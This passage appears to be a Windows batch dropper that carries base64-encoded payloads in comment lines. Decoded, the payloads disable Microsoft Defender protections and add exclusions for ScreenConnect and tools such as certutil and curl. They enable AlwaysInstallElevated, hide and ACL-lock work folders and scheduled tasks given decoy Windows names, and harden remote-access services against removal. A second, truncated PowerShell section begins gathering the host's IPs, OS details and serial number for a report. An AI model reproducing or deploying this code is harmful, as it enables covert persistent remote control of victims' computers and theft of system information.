::d3NcSW5zdGFsbGVyIiAvdiBBbHdheXNJbnN0YWxsRWxldmF0ZWQgL3QgUkVHX0RX
::T1JEIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgZGVsZXRlICJIS0NVXFNPRlRXQVJF
::XFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3YgRGlzYWJs
::ZU1TSSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLQ1VcU09GVFdBUkVcUG9saWNp
::ZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyIiAvdiBBbHdheXNJbnN0YWxs
::RWxldmF0ZWQgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQoNClJFTSAt
::LS0gRGVmZW5kZXI6IHJlZ2lzdHJ5IGV4Y2x1c2lvbnMgKHBvbGljeSArIHByZWZl
::cmVuY2Uga2V5cykgLS0tDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVz
::XE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyIiAvdiBEaXNhYmxlQW50aVNweXdh
::cmUgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xN
::XFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXFJl
::YWwtVGltZSBQcm90ZWN0aW9uIiAvdiBEaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5n
::IC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxT
::T0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxSZWFs
::LVRpbWUgUHJvdGVjdGlvbiIgL3YgRGlzYWJsZUJlaGF2aW9yTW9uaXRvcmluZyAv
::dCBSRUdfRFdPUkQgL2QgMSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09G
::VFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcUmVhbC1U
::aW1lIFByb3RlY3Rpb24iIC92IERpc2FibGVJT0FWUHJvdGVjdGlvbiAvdCBSRUdf
::RFdPUkQgL2QgMSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVc
::UG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcUmVhbC1UaW1lIFBy
::b3RlY3Rpb24iIC92IERpc2FibGVTY3JpcHRTY2FubmluZyAvdCBSRUdfRFdPUkQg
::L2QgMSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9z
::b2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVXRCUi
::IC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxT
::T0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBh
::dGhzIiAvdiAiJVdEMiUiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0K
::cmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRl
::clxFeGNsdXNpb25zXFBhdGhzIiAvdiAiQzpcV2luZG93c1xUZW1wIiAvdCBSRUdf
::RFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVc
::TWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3Yg
::IiVURU1QJSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRk
::ICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1
::c2lvbnNcUGF0aHMiIC92ICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VF
::UDElKSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJI
::S0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lv
::bnNcUGF0aHMiIC92ICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDIl
::KSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xN
::XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNc
::UGF0aHMiIC92ICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSIg
::L3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNP
::RlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0
::aHMiIC92ICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50KiIgL3QgUkVHX0RXT1JE
::IC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jv
::c29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIlUEY4
::NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUpIiAvdCBSRUdfRFdPUkQg
::L2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9z
::b2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVQRjg2
::JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSkiIC90IFJFR19EV09SRCAv
::ZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3Nv
::ZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVBGODYl
::XFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSIgL3QgUkVHX0RXT1JEIC9k
::IDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29m
::dFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIlUEY4NiVc
::U2NyZWVuQ29ubmVjdCBDbGllbnQqIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVs
::IDI+JjENCmZvciAlJVAgaW4gKG1zaWV4ZWMuZXhlIGN1cmwuZXhlIGNtZC5leGUg
::cG93ZXJzaGVsbC5leGUgY2VydHV0aWwuZXhlIFNjcmVlbkNvbm5lY3QuQ2xpZW50
::U2VydmljZS5leGUgU2NyZWVuQ29ubmVjdC5XaW5kb3dzQ2xpZW50LmV4ZSkgZG8g
::KA0KICByZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERl
::ZmVuZGVyXEV4Y2x1c2lvbnNcUHJvY2Vzc2VzIiAvdiAiJSVQIiAvdCBSRUdfRFdP
::UkQgL2QgMCAvZiA+bnVsIDI+JjENCikNCg0KUkVNIC0tLSBEZWZlbmRlcjogbGl2
::ZSBNcFByZWZlcmVuY2UgKHN0cm9uZ2VyIHRoYW4gcmVnIGFsb25lKSAtLS0NCnBv
::d2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRp
::b25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kIF4NCiAgIiRFcnJvckFjdGlvblByZWZl
::cmVuY2U9J1NpbGVudGx5Q29udGludWUnOyIgXg0KICAiVHJ5e1NldC1NcFByZWZl
::cmVuY2UgLURpc2FibGVSZWFsdGltZU1vbml0b3JpbmcgJHRydWU7IFNldC1NcFBy
::ZWZlcmVuY2UgLURpc2FibGVCZWhhdmlvck1vbml0b3JpbmcgJHRydWU7IFNldC1N
::cFByZWZlcmVuY2UgLURpc2FibGVJT0FWUHJvdGVjdGlvbiAkdHJ1ZTsgU2V0LU1w
::UHJlZmVyZW5jZSAtRGlzYWJsZVNjcmlwdFNjYW5uaW5nICR0cnVlfUNhdGNoe307
::IiBeDQogICIkcGF0aHM9QCgnJVdEJScsJyVXRDIlJywnQzpcV2luZG93c1xUZW1w
::JywkZW52OlRFTVAsJyVQRiVcU2NyZWVuQ29ubmVjdCBDbGllbnQqJywnJVBGODYl
::XFNjcmVlbkNvbm5lY3QgQ2xpZW50KicpOyIgXg0KICAidHJ5eyRwYXRocys9QChH
::ZXQtQ2hpbGRJdGVtIC1QYXRoICRlbnY6UHJvZ3JhbUZpbGVzIC1GaWx0ZXIgJ1Nj
::cmVlbkNvbm5lY3QgQ2xpZW50KicgLURpcmVjdG9yeSAtRUEgMCB8IEZvckVhY2gt
::T2JqZWN0IHskXy5GdWxsTmFtZX0pfWNhdGNoe307IiBeDQogICJ0cnl7JHBmODY9
::W0Vudmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aCgnUHJvZ3JhbUZpbGVzWDg2Jyk7
::IGlmKCRwZjg2KXskcGF0aHMrPUAoR2V0LUNoaWxkSXRlbSAtUGF0aCAkcGY4NiAt
::RmlsdGVyICdTY3JlZW5Db25uZWN0IENsaWVudConIC1EaXJlY3RvcnkgLUVBIDAg
::fCBGb3JFYWNoLU9iamVjdCB7JF8uRnVsbE5hbWV9KX19Y2F0Y2h7fTsiIF4NCiAg
::ImZvcmVhY2goJHAgaW4gKCRwYXRocyB8IFNlbGVjdC1PYmplY3QgLVVuaXF1ZSkp
::eyBpZigkcCl7IEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggJHAgLUVB
::IDAgfSB9OyIgXg0KICAiZm9yZWFjaCgkeCBpbiBAKCdtc2lleGVjLmV4ZScsJ2N1
::cmwuZXhlJywnY21kLmV4ZScsJ3Bvd2Vyc2hlbGwuZXhlJywnY2VydHV0aWwuZXhl
::JywnU2NyZWVuQ29ubmVjdC5DbGllbnRTZXJ2aWNlLmV4ZScsJ1NjcmVlbkNvbm5l
::Y3QuV2luZG93c0NsaWVudC5leGUnKSl7IEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1
::c2lvblByb2Nlc3MgJHggLUVBIDAgfTsiIF4NCiAgIkFkZC1NcFByZWZlcmVuY2Ug
::LUV4Y2x1c2lvbkV4dGVuc2lvbiAnLmNtZCcsJy5wczEnLCcubXNpJyAtRUEgMCIg
::Pm51bCAyPiYxDQoNClJFTSAtLS0gQUNMOiBvbmx5IFNZU1RFTSArIEFkbWluaXN0
::cmF0b3JzIG9uIHBlcnNpc3QgZGlycyAtLS0NCmNhbGwgOkxvY2tEaXIgIiVXRCUi
::DQpjYWxsIDpMb2NrRGlyICIlV0QyJSINCg0KUkVNIC0tLSBoaWRlIHdvcmtkaXJz
::ICsga2V5IHBheWxvYWQgZmlsZXMgLS0tDQphdHRyaWIgK2ggK3MgIiVXRCUiID5u
::dWwgMj4mMQ0KYXR0cmliICtoICtzICIlV0QyJSIgPm51bCAyPiYxDQpSRU0gUzU6
::IGRvIE5PVCBoaWRlL2xvY2sgdGhlIG11dGFibGUgcGF5bG9hZCBzY3JpcHRzIC0g
::Y29weS9tb3ZlIG92ZXIgK2ggK3MgZmlsZXMNClJFTSBmYWlscyBzaWxlbnRseSBh
::bmQgZnJvemUgdGhlIHdob2xlIGZsZWV0J3Mgc2VsZi11cGRhdGUuIEhpZGRlbiBk
::aXJzIGNvbmNlYWwgY29udGVudHMgYWxyZWFkeS4NCmZvciAlJUYgaW4gKHBrZy5t
::c2kgbm90aWZ5LmNmZyBpZGVudGl0eS5jZmcgc3RhdGUuanNvbikgZG8gKA0KICBp
::ZiBleGlzdCAiJVdEJVwlJUYiIGF0dHJpYiAraCArcyAiJVdEJVwlJUYiID5udWwg
::Mj4mMQ0KKQ0KDQpSRU0gLS0tIEFDTDogc2NoZWR1bGVkIHRhc2sgWE1MIChoYXJk
::ZXIgdG8gZGVsZXRlIHdpdGhvdXQgQWRtaW4pIC0tLQ0KUkVNIFM2OiBuYW1lcyBj
::b250YWluIHNwYWNlcyAoIlNlcnZlciBEaWFnbm9zdGljcyIpIC0gdGhlIGNtZCBG
::T1IgbG9vcCBzcGxpdA0KUkVNIHRoZW0gaW50byBnYXJiYWdlIHRva2Vucy4gUG93
::ZXJTaGVsbCByZWFkcyBpZGVudGl0eS5jZmcgZGlyZWN0bHkgaW5zdGVhZC4NCnBv
::d2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRp
::b25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kIF4NCiAgIiRFcnJvckFjdGlvblByZWZl
::cmVuY2U9J1NpbGVudGx5Q29udGludWUnOyAkbmFtZXM9QCgpOyIgXg0KICAiaWYo
::VGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAnJVdEJVxpZGVudGl0eS5jZmcnKXsgR2V0
::LUNvbnRlbnQgLUxpdGVyYWxQYXRoICclV0QlXGlkZW50aXR5LmNmZycgLUZvcmNl
::IHwgRm9yRWFjaC1PYmplY3QgeyBpZigkXyAtbWF0Y2ggJ15UQVNLX1tBLURdPSgu
::KykkJyl7ICRuYW1lcyArPSAkbWF0Y2hlc1sxXS5UcmltKCkuVHJpbVN0YXJ0KCdc
::JykgfSB9IH0iIF4NCiAgImVsc2UgeyAkbmFtZXM9QCgnV2VyUXVldWVTeW5jJywn
::UGxhU2VydmVySGVhbHRoJywnV2RpSG9zdFByb3h5JywnVGNwSXBDb25mbGljdFJl
::cycpIH07IiBeDQogICJmb3JlYWNoKCRuIGluICRuYW1lcyl7ICRmID0gSm9pbi1Q
::YXRoICclVEFTS1JPT1QlJyAkbjsgaWYoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAk
::Zil7ICYgaWNhY2xzLmV4ZSAkZiAvaW5oZXJpdGFuY2U6ciB8IE91dC1OdWxsOyAm
::IGljYWNscy5leGUgJGYgL2dyYW50OnIgJ05UIEFVVEhPUklUWVxTWVNURU06Ricg
::J0JVSUxUSU5cQWRtaW5pc3RyYXRvcnM6RicgfCBPdXQtTnVsbDsgJiBhdHRyaWIu
::ZXhlICtoICtzICRmIHwgT3V0LU51bGwgfSB9IiA+bnVsIDI+JjENCg0KUkVNIC0t
::LSBBQ0w6IFdNSSB3YXRjaGRvZyBzdWJzY3JpcHRpb24gZmlsZXMgKGNoYWluIDIp
::IC0tLQ0KaWNhY2xzICIlU3lzdGVtUm9vdCVcU3lzdGVtMzJcd2JlbVxSZXBvc2l0
::b3J5IiAvZ3JhbnQgIk5UIEFVVEhPUklUWVxTWVNURU06RiIgPm51bCAyPiYxDQoN
::ClJFTSAtLS0gQUNMOiBkbyBOT1QgTG9ja0RpciBTY3JlZW5Db25uZWN0IGluc3Rh
::bGwgZGlycyAtLS0NClJFTSB0YWtlb3duK3N0cmlwIG9uIGxpdmUgU0MgZGlycyBi
::cmVha3MgY2xpZW50IGZpbGUgd3JpdGVzL3VwZGF0ZXMg4oaSIHBhbmVsIE9GRkxJ
::TkUNClJFTSB3aGlsZSBzZXJ2aWNlIHN0aWxsIGxvb2tzIFJ1bm5pbmcuIERlZmVu
::ZGVyIGV4Y2x1c2lvbnMgKyBzZXJ2aWNlIFNEIGFyZSBlbm91Z2guDQpSRU0gTzM3
::OiBvbmUtc2hvdCB1bmxvY2sgaWYgYSBwcmlvciBidWlsZCBMb2NrRGlyJ2QgdGhl
::c2UgcGF0aHMuDQppZiBleGlzdCAiJVdEJVxzZWN1cmVfc2MuZmxhZyIgKA0KICBm
::aW5kc3RyIC9DOiJzY19ub2xvY2tfZGlycyIgIiVXRCVcc2VjdXJlX3NjLmZsYWci
::ID5udWwgMj4mMQ0KICBpZiBlcnJvcmxldmVsIDEgKA0KICAgIGVjaG8gc2NfdW5s
::b2NrX3ByaW9yX2xvY2tkaXI+PiIlTE9HJSINCiAgICBmb3IgJSVEIGluICgNCiAg
::ICAgICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDElKSINCiAgICAg
::ICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDIlKSINCiAgICAgICIl
::UEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSINCiAgICAgICIlUEY4
::NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUpIg0KICAgICAgIiVQRjg2
::JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSkiDQogICAgICAiJVBGODYl
::XFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSINCiAgICApIGRvICgNCiAg
::ICAgIGlmIGV4aXN0ICIlJX5EIiAoDQogICAgICAgIHRha2Vvd24gL0YgIiUlfkQi
::IC9SIC9EIFkgPm51bCAyPiYxDQogICAgICAgIGljYWNscyAiJSV+RCIgL3Jlc2V0
::IC9UIC9DIC9RID5udWwgMj4mMQ0KICAgICAgICBpY2FjbHMgIiUlfkQiIC9ncmFu
::dCAiTlQgQVVUSE9SSVRZXFNZU1RFTTooT0kpKENJKUYiICJCVUlMVElOXEFkbWlu
::aXN0cmF0b3JzOihPSSkoQ0kpRiIgPm51bCAyPiYxDQogICAgICApDQogICAgKQ0K
::ICAgIGVjaG8gc2Nfbm9sb2NrX2RpcnM+JVdEJVxzZWN1cmVfc2MuZmxhZw0KICAp
::DQopIGVsc2UgKA0KICBlY2hvIHNjX25vbG9ja19kaXJzPiVXRCVcc2VjdXJlX3Nj
::LmZsYWcNCikNCg0KUkVNIC0tLSBTQyBzZXJ2aWNlczogU1lTVEVNIGNhbiBjb25m
::aWcvc3RvcC9kZWxldGUvc2RzZXQ7IEJBIGZ1bGw7IHVzZXJzIGJsb2NrZWQgLS0t
::DQpSRU0gUzEyOiBTWSBtdXN0IGluY2x1ZGUgU0QgKERFTEVURSkgKyBXRCAoV1JJ
::VEVfREFDKSArIFdQIHNvIG9ycGhhbiBoZWFsIC8gRlAgbWlncmF0aW9uIC8NClJF
::TSBzYyBzZHNldCByZS1hcHBseSB3b3JrIHVuZGVyIFNZU1RFTSAodGFza3MgcnVu
::IGFzIFNZU1RFTSkuIFdpdGhvdXQgU0QsIHNjIGRlbGV0ZSBBY2Nlc3MgRGVuaWVk
::Lg0Kc2V0ICJTRD1EOihBOztDQ0RDTENTV1JQV1BEVExPQ1JSQ1NEV1A7OztTWSko
::QTs7Q0NEQ0xDU1dSUFdQRFRMT0NSU0RSQ1dEV087OztCQSkiDQpzYy5leGUgc2Rz
::ZXQgIiVQUklNJSIgIiVTRCUiID5udWwgMj4mMQ0Kc2MuZXhlIHNkc2V0ICIlQUxU
::JSIgIiVTRCUiID5udWwgMj4mMQ0Kc2MuZXhlIHNkc2V0ICIlR1JZWEElIiAiJVNE
::JSIgPm51bCAyPiYxDQpzYy5leGUgY29uZmlnICIlUFJJTSUiIHN0YXJ0PSBhdXRv
::ID5udWwgMj4mMQ0Kc2MuZXhlIGNvbmZpZyAiJUFMVCUiIHN0YXJ0PSBhdXRvID5u
::dWwgMj4mMQ0Kc2MuZXhlIGNvbmZpZyAiJUdSWVhBJSIgc3RhcnQ9IGF1dG8gPm51
::bCAyPiYxDQpzYy5leGUgZmFpbHVyZSAiJVBSSU0lIiByZXNldD0gODY0MDAgYWN0
::aW9ucz0gcmVzdGFydC82MDAwMC9yZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAg
::Pm51bCAyPiYxDQpzYy5leGUgZmFpbHVyZSAiJUFMVCUiIHJlc2V0PSA4NjQwMCBh
::Y3Rpb25zPSByZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAvcmVzdGFydC82MDAw
::MCA+bnVsIDI+JjENCnNjLmV4ZSBmYWlsdXJlICIlR1JZWEElIiByZXNldD0gODY0
::MDAgYWN0aW9ucz0gcmVzdGFydC82MDAwMC9yZXN0YXJ0LzYwMDAwL3Jlc3RhcnQv
::NjAwMDAgPm51bCAyPiYxDQoNCmVjaG8gc2VjdXJlX2RvbmU+PiIlTE9HJSINCmV4
::aXQgL2IgMA0KDQo6TG9ja0Rpcg0Kc2V0ICJUPSV+MSINCmlmIG5vdCBleGlzdCAi
::JVQlIiBleGl0IC9iIDANClJFTSB0YWtlIG93bmVyc2hpcCB0aGVuIHN0cmlwIGlu
::aGVyaXRlZCBBQ0VzOyBTWVNURU0rQWRtaW5zIG9ubHkNCnRha2Vvd24gL0YgIiVU
::JSIgL1IgL0QgWSA+bnVsIDI+JjENCmljYWNscyAiJVQlIiAvaW5oZXJpdGFuY2U6
::ciA+bnVsIDI+JjENCmljYWNscyAiJVQlIiAvZ3JhbnQ6ciAiTlQgQVVUSE9SSVRZ
::XFNZU1RFTTooT0kpKENJKUYiICJCVUlMVElOXEFkbWluaXN0cmF0b3JzOihPSSko
::Q0kpRiIgPm51bCAyPiYxDQppY2FjbHMgIiVUJSIgL3JlbW92ZTpnICJVc2VycyIg
::IkF1dGhlbnRpY2F0ZWQgVXNlcnMiICJFdmVyeW9uZSIgIk5UIEFVVEhPUklUWVxJ
::TlRFUkFDVElWRSIgIkJVSUxUSU5cVXNlcnMiID5udWwgMj4mMQ0KZXhpdCAvYiAw
::DQo=
::B64_SEC_END
::B64_TGR_BEGIN
::I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQ0KIyBUR19SRVBPUlQgQlVJTEQgMjAyNjA4
::MDJUMTYgLSByb290LWxldmVsIHRhc2sgbmFtZXMgKElERU5UVkVSPTcpOyBUUiBv
::d25lcnNoaXA7IFJNTStEYXR0byBrZWVwOyBkeW5hbWljIGdyeXhhIEZQDQpwYXJh
::bSgNCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV1bc3RyaW5nXSRT
::dGF0ZSwNCiAgICBbc3RyaW5nXSRTdW1tYXJ5ID0gJycsDQogICAgW3N0cmluZ10k
::V29ya0RpciA9ICdDOlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcV2luZG93c1xXRVJc
::VGVtcFwud3VjYWNoZScsDQogICAgW3N0cmluZ10kT2xkU3RhdGUgPSAnJywNCiAg
::ICBbVmFsaWRhdGVTZXQoJ3JpY2gnLCAnY29tcGFjdCcpXVtzdHJpbmddJE1vZGUg
::PSAncmljaCcsDQogICAgW3N0cmluZ10kQnVpbGQgPSAnTzE1JywNCiAgICBbc3Ry
::aW5nXSRDb3VudCA9ICcwJw0KKQ0KDQokRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0g
::J1NpbGVudGx5Q29udGludWUnDQokUHJvZ3Jlc3NQcmVmZXJlbmNlID0gJ1NpbGVu
::dGx5Q29udGludWUnDQp0cnkgeyBbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpT
::ZWN1cml0eVByb3RvY29sID0gW05ldC5TZWN1cml0eVByb3RvY29sVHlwZV06OlRs
::czEyIH0gY2F0Y2gge30NCg0KZnVuY3Rpb24gR2V0LUNmZyB7DQogICAgJHBhdGgg
::PSBKb2luLVBhdGggJFdvcmtEaXIgJ25vdGlmeS5jZmcnDQogICAgJGNmZyA9IEB7
::fQ0KICAgIGlmICgtbm90IChUZXN0LVBhdGggJHBhdGgpKSB7IHJldHVybiAkY2Zn
::IH0NCiAgICBHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJHBhdGggfCBGb3JFYWNo
::LU9iamVjdCB7DQogICAgICAgIGlmICgkXyAtbWF0Y2ggJ15ccyooW0EtWmEtejAt
::OV9dKylccyo9XHMqKC4qKVxzKiQnKSB7DQogICAgICAgICAgICAkY2ZnWyRtYXRj
::aGVzWzFdXSA9ICRtYXRjaGVzWzJdLlRyaW0oKQ0KICAgICAgICB9DQogICAgfQ0K
::ICAgIHJldHVybiAkY2ZnDQp9DQoNCmZ1bmN0aW9uIEVzYyhbc3RyaW5nXSRzKSB7
::DQogICAgaWYgKCRudWxsIC1lcSAkcykgeyByZXR1cm4gJycgfQ0KICAgIHJldHVy
::biAoJHMgLXJlcGxhY2UgJyYnLCAnJmFtcDsnIC1yZXBsYWNlICc8JywgJyZsdDsn
::IC1yZXBsYWNlICc+JywgJyZndDsnKQ0KfQ0KDQpmdW5jdGlvbiBHZXQtUHVibGlj
::SXAgew0KICAgIGZvcmVhY2ggKCR1IGluIEAoDQogICAgICAgICAgICAnaHR0cHM6
::Ly9hcGkuaXBpZnkub3JnJywNCiAgICAgICAgICAgICdodHRwczovL2lmY29uZmln
::Lm1lL2lwJywNCiAgICAgICAgICAgICdodHRwczovL2ljYW5oYXppcC5jb20nDQog
::ICAgICAgICkpIHsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICRyID0gSW52
::b2tlLVdlYlJlcXVlc3QgLVVyaSAkdSAtVXNlQmFzaWNQYXJzaW5nIC1UaW1lb3V0
::U2VjIDYNCiAgICAgICAgICAgICRpcCA9ICgkci5Db250ZW50IHwgT3V0LVN0cmlu
::ZykuVHJpbSgpDQogICAgICAgICAgICBpZiAoJGlwIC1tYXRjaCAnXlxkezEsM30o
::XC5cZHsxLDN9KXszfSQnIC1vciAkaXAgLW1hdGNoICc6JykgeyByZXR1cm4gJGlw
::IH0NCiAgICAgICAgfSBjYXRjaCB7fQ0KICAgIH0NCiAgICByZXR1cm4gJ24vYScN
::Cn0NCg0KZnVuY3Rpb24gR2V0LUxvY2FsSXBzIHsNCiAgICB0cnkgew0KICAgICAg
::ICAkaXBzID0gR2V0LU5ldElQQWRkcmVzcyAtQWRkcmVzc0ZhbWlseSBJUHY0IC1F
::cnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwNCiAgICAgICAgICAgIFdoZXJl
::LU9iamVjdCB7ICRfLklQQWRkcmVzcyAtbm90bGlrZSAnMTI3LionIC1hbmQgJF8u
::UHJlZml4T3JpZ2luIC1uZSAnV2VsbEtub3duJyB9IHwNCiAgICAgICAgICAgIFNl
::bGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IElQQWRkcmVzcyAtVW5pcXVlDQog
::ICAgICAgIGlmICgkaXBzKSB7IHJldHVybiAoJGlwcyAtam9pbiAnLCAnKSB9DQog
::ICAgfSBjYXRjaCB7fQ0KICAgIHRyeSB7DQogICAgICAgICRpcHMgPSBHZXQtQ2lt
::SW5zdGFuY2UgV2luMzJfTmV0d29ya0FkYXB0ZXJDb25maWd1cmF0aW9uIC1GaWx0
::ZXIgJ0lQRW5hYmxlZD1UcnVlJyB8DQogICAgICAgICAgICBGb3JFYWNoLU9iamVj
::dCB7ICRfLklQQWRkcmVzcyB9IHwgV2hlcmUtT2JqZWN0IHsgJF8gLWFuZCAkXyAt
::bm90bGlrZSAnMTI3LionIC1hbmQgJF8gLW5vdGxpa2UgJyo6KicgfQ0KICAgICAg
::ICBpZiAoJGlwcykgeyByZXR1cm4gKCgkaXBzIHwgU2VsZWN0LU9iamVjdCAtVW5p
::cXVlKSAtam9pbiAnLCAnKSB9DQogICAgfSBjYXRjaCB7fQ0KICAgIHJldHVybiAn
::bi9hJw0KfQ0KDQpmdW5jdGlvbiBHZXQtT3NJbmZvIHsNCiAgICAkbyA9IFtvcmRl
::cmVkXUB7DQogICAgICAgIENhcHRpb24gPSAnbi9hJzsgVmVyc2lvbiA9ICduL2En
::OyBCdWlsZCA9ICduL2EnOyBBcmNoID0gJ24vYScNCiAgICAgICAgRG9tYWluID0g
::J24vYSc7IEluc3RhbGxEYXRlID0gJ24vYSc7IExhc3RCb290ID0gJ24vYScNCiAg
::ICAgICAgQ1BVID0gJ24vYSc7IE1hbnVmYWN0dXJlciA9ICduL2EnOyBNb2RlbCA9
::ICduL2EnOyBTZXJpYWwgPSAnbi9hJw0KICAgICAgICBUb3RhbFJBTV9HQiA9ICdu
::L2EnOyBEaXNrRnJlZV9HQiA9ICduL2EnOyBEaXNrU2l6ZV9HQiA9ICduL2EnDQog
::ICAgfQ0KICAgIHRyeSB7DQogICAgICAgICRvcyA9IEdldC1DaW1JbnN0YW5jZSBX
::aW4zMl9PcGVyYXRpbmdTeXN0ZW0NCiAgICAgICAgJG8uQ2FwdGlvbiA9ICRvcy5D
::YXB0aW9uDQogICAgICAgICRvLlZlcnNpb24gPSAkb3MuVmVyc2lvbg0KICAgICAg
::ICAkby5CdWlsZCA9ICRvcy5CdWlsZE51bWJlcg0KICAgICAgICAkby5BcmNoID0g
::JG9zLk9TQXJjaGl0ZWN0dXJlDQogICAgICAgICRvLkluc3RhbGxEYXRlID0gKCRv
::cy5JbnN0YWxsRGF0ZSB8IEdldC1EYXRlIC1Gb3JtYXQgJ3l5eXktTU0tZGQnKQ0K
::ICAgICAgICAkby5MYXN0Qm9vdCA9ICgkb3MuTGFzdEJvb3RVcFRpbWUgfCBHZXQt
::RGF0ZSAtRm9ybWF0ICd5eXl5LU1NLWRkIEhIOm1tJykNCiAgICAgICAgJG8uVG90
::YWxSQU1fR0IgPSBbbWF0aF06OlJvdW5kKCRvcy5Ub3RhbFZpc2libGVNZW1vcnlT
::aXplIC8gMU1CLCAxKQ0KICAgIH0gY2F0Y2gge30NCiAgICB0cnkgew0KICAgICAg
